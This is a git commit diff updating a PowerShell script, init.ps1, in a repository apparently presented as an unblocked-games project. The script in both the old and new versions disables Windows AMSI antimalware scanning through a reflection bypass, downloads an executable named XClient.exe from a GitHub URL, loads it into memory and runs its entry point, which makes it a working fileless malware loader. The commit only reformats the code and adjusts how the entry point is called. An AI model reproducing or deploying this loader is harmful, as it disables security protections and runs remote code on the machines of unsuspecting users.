db2ad244b7bd0a75dfdfdfa03acdf58875064ca4
Fanta <163449006+unblockedgames2@users.noreply.github.com>
2024-09-29 14:14:48 -0400

    Update init.ps1

--- init.ps1
+++ init.ps1
@@ -1,1 +1,12 @@
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); $wc = New-Object System.Net.WebClient; $bytes = $wc.DownloadData('https://github.com/unblockedgames2/Fanta.Live/raw/refs/heads/main/XClient.exe'); $assembly = [System.Reflection.Assembly]::Load($bytes); $entryPoint = $assembly.EntryPoint; if ($entryPoint) { $entryPoint.Invoke($null, @(, [string[]]@()));}
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); 
+$wc = New-Object System.Net.WebClient; 
+$bytes = $wc.DownloadData('https://github.com/unblockedgames2/Fanta.Live/raw/refs/heads/main/XClient.exe'); 
+$assembly = [System.Reflection.Assembly]::Load($bytes); 
+$entryPoint = $assembly.EntryPoint; 
+if ($entryPoint) { 
+    if ($entryPoint.GetParameters().Length -eq 0) {
+        $entryPoint.Invoke($null, @())
+    } else {
+        $entryPoint.Invoke($null, @([string[]]@()))
+    }
+}
